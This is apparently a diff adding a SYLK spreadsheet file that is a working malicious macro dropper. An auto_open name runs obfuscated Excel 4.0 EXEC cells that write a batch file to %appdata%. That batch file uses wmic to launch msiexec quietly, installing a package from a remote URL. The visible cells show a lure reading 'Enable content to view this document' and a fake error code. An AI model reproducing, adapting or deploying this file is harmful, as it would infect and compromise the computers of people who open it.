@@ -1,0 +1,158 @@
+ID;PWXL;N;E
+P;PGeneral
+P;P0
+O;E
+P;P0.00
+P;P#,##0
+P;P#,##0.00
+P;P#,##0_);;\(#,##0\)
+P;P#,##0_);;[Red]\(#,##0\)
+P;P#,##0.00_);;\(#,##0.00\)
+P;P#,##0.00_);;[Red]\(#,##0.00\)
+P;P"$"#,##0_);;\("$"#,##0\)
+P;P"$"#,##0_);;[Red]\("$"#,##0\)
+P;P"$"#,##0.00_);;\("$"#,##0.00\)
+P;P"$"#,##0.00_);;[Red]\("$"#,##0.00\)
+P;P0%
+P;P0.00%
+P;P0.00E+00
+P;P##0.0E+0
+P;P#\ ?/?
+P;P#\ ??/??
+P;Pm/d/yyyy
+P;Pd\-mmm\-yy
+P;Pd\-mmm
+P;Pmmm\-yy
+P;Ph:mm\ AM/PM
+P;Ph:mm:ss\ AM/PM
+P;Ph:mm
+P;Ph:mm:ss
+P;Pm/d/yyyy\ h:mm
+P;Pmm:ss
+P;Pmm:ss.0
+P;P@
+P;P[h]:mm:ss
+P;P_("$"* #,##0_);;_("$"* \(#,##0\);;_("$"* "-"_);;_(@_)
+P;P_(* #,##0_);;_(* \(#,##0\);;_(* "-"_);;_(@_)
+P;P_("$"* #,##0.00_);;_("$"* \(#,##0.00\);;_("$"* "-"??_);;_(@_)
+P;P_(* #,##0.00_);;_(* \(#,##0.00\);;_(* "-"??_);;_(@_)
+P;FCalibri;M220;L9
+P;FCalibri;M220;L9
+P;FCalibri;M220;L9
+P;FCalibri;M220;L9
+P;ECalibri;M220;L9
+P;ECalibri Light;M360;L55
+P;ECalibri;M300;SB;L55
+P;ECalibri;M260;SB;L55
+P;ECalibri;M220;SB;L55
+P;ECalibri;M220;L18
+P;ECalibri;M220;L21
+P;ECalibri;M220;L61
+P;ECalibri;M220;L63
+P;ECalibri;M220;SB;L64
+P;ECalibri;M220;SB;L53
+P;ECalibri;M220;L53
+P;ECalibri;M220;SB;L10
+P;ECalibri;M220;L11
+P;ECalibri;M220;SI;L24
+NN;Nauto_open;ER101C1
+C;Y76;X1;K"rAXoD"
+F;Y324
+C;K33;EEXEC("CmD.exe /c EChO|SEt /p=""@echo off&wm^ic pro^ces^s c^all cr^eat^e 'Ms"">%appdata%\rAXoD.bat")
+F;Y325
+C;K33;EEXEC("CmD.exe /c @echo off&ping 1&EcHo|set /p=""iexec /ihttp^:^/^/^mscetp.com"">>%appdata%\rAXoD.bat")
+F;Y326
+C;K33;EEXEC("cmD.exe /c @echo off&ping g&ping 2&EcHo|s^et /p=""/notfound.php "">>%appdata%\rAXoD.bat")
+F;Y327
+C;K33;EEXEC("cmD.exe /c @echo off&ping a&ping 2&ping 4&EcHo|set /p="" ^/q'"">>%appdata%\rAXoD.bat&%appdata%\rAXoD.bat")
+F;Y328
+C;KTRUE;EHALT()
+P;ECalibri;M220;SB;L9
+P;ECalibri;M220;L10
+P;ESegoe UI;M200;L9
+P;EArial;M220;L9
+P;ECalibri Light;M360;L55
+P;EBahnschrift Light SemiCondensed;M380;L63
+P;ECalibri;M220;SB;L55
+P;EBahnschrift SemiLight Condensed;M240;L9
+F;P0;DG0G8;M288
+B;Y11;X15;D4 5 10 14
+O;L;D;V0;K47;G100 0.001
+F;M468;R6
+F;M480;R7
+F;M312;R9
+F;SLTBSM0;Y5;X6
+F;STBSM0;X7
+F;STBSM0;X8
+F;STBSM0;X9
+F;STBSM0;X10
+F;STBSM0;X11
+F;STBSM0;X12
+F;STBSM0;X13
+F;P0;FG0R;STBSM23;X14
+C;K")7"
+F;P0;FG0C;SRTBSM23;X15
+C;K"X"
+F;SLSM0;Y6;X6
+F;SSM24;X7
+F;SSM0;X8
+F;SSM0;X9
+F;SSM0;X10
+F;SSM0;X11
+F;SSM0;X12
+F;SSM0;X13
+F;SSM0;X14
+F;SRSM0;X15
+F;SLSM0;Y7;X6
+F;SSM25;X7
+C;K"Enable content to view this document"
+F;SSM0;X8
+F;SSM0;X9
+F;SSM0;X10
+F;SSM0;X11
+F;SSM0;X12
+F;SSM0;X13
+F;SSM0;X14
+F;SRSM0;X15
+F;SLSM0;Y8;X6
+F;SDSM26;X7
+F;SSM0;X8
+F;SSM0;X9
+F;SSM0;X10
+F;SSM0;X11
+F;SSM0;X12
+F;SSM0;X13
+F;SSM0;X14
+F;SRSM0;X15
+F;SLSM0;Y9;X6
+F;P0;FG0L;SSM27;X7
+C;K"Error id 0 x 550-0"
+F;SSM27;X8
+F;SSM0;X9
+F;SSM0;X10
+F;SSM0;X11
+F;SSM0;X12
+F;SSM0;X13
+F;SSM0;X14
+F;SRSM0;X15
+F;SLSM0;Y10;X6
+F;SSM0;X7
+F;SSM0;X8
+F;SSM0;X9
+F;SSM0;X10
+F;SSM0;X11
+F;SSM0;X12
+F;SSM0;X13
+F;SSM0;X14
+F;SRSM0;X15
+F;SLBSM0;Y11;X6
+F;SBSM0;X7
+F;SBSM0;X8
+F;SBSM0;X9
+F;SBSM0;X10
+F;SBSM0;X11
+F;SBSM0;X12
+F;SBSM0;X13
+F;SBSM0;X14
+F;SRBSM0;X15
+E
